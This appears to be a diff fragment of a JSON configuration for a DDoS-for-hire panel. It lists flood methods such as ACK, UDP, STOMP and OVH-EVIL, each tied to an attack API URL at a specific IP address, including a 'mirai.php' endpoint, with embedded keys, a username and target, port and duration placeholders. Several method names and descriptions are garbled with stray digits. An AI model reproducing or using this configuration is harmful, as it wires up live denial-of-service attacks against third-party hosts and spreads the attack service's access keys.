+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "ACK",
+               "AttackName" : "ACK",
+               "Description" : "Normal ACK Flood",
+               "API" : "http://51.77.108.8/mirai.php?key=valleyprivate&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=ACK",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "UDP",
+               "AttackName" : "UDP",
+               "Description" : "Normal UDP Flood",
+               "API" : "http://51.77.108.8/mirai.php?key=valleyprivate&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=UDP",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "UDPPLAIN",
+               "AttackName" : "UDPPLAIN",
+               "Description" : "Normal UDPPLAIN Flood",
+               "API" : "http://51.77.108.8/mirai.php?key=valleyprivate&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=UDPPLAIN",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "DOMINATE",
+               "AttackName" : "DOMINATE",
+               "Description" : "Normal DOMINATE Flood",
+               "API" : "http://51.77.108.8/mirai.php?key=valleyprivate&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=DOMINATE",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "STOMP",
+               "AttackName" : "BLAZING-FAST",
+               "Description" : "Normal BLAZING-FAST Flood",
+               "API" : "http://51.77.108.8/mirai.php?key=valleyprivate&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=STOMP",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "BLAZING-FAST1",
+               "AttackName" : "BLAZING-FAST1",
+               "Description" : "Normal BLAZING-FAS421T Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=BLAZING-FAST1",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "BLAZING-2FAST",
+               "AttackName" : "BLAZING-FAS2T",
+               "Description" : "Normal BLAZING-FAST2 Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=BLAZING-FAST2",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "BLAZING-F2AS5T",
+               "AttackName" : "BLAZING-62FAST",
+               "Description" : "Normal BLAZIN2G-FAST Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=BLAZING-FAST2",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "BLAZING5F53AST",
+               "AttackName" : "BLAZI63NG-FAST",
+               "Description" : "Normal BLAZ73ING-FAST Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=BLAZING-FAS2T",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "80",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "OVH-EVIL",
+               "AttackName" : "OVH-EVIL",
+               "Description" : "Normal OVH-EVIL Flood",
+               "API" : "http://51.77.108.8:8080/attack?username=grim&key=starrapipv&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=OVH-EVIL",
+
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+
+               "DefaultPort" : "443",
+
+
+               "AdminMethod" : false,
+               "VipMethod" : false
+          }
+     ]
+}
